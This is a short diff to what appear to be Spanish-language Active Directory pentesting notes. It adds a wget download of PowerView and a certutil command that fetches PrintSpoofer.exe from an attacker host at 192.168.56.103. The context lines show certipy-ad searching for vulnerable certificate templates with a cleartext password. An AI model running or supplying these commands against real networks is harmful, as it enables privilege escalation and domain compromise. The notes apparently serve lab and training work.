@@ -859,6 +859,13 @@ certipy-ad find -u 'svcapp1' -p 'Hola1234$' -dc-ip 10.0.2.6 -vulnerable -stdout
 https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
 
 
+# PowerView
+
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
+
+# Descargar Archivos 
+
+certutil -urlcache -split -f "http://192.168.56.103:8000/PrintSpoofer.exe" "PrintSpoofer.exe" 
 
 ---
 
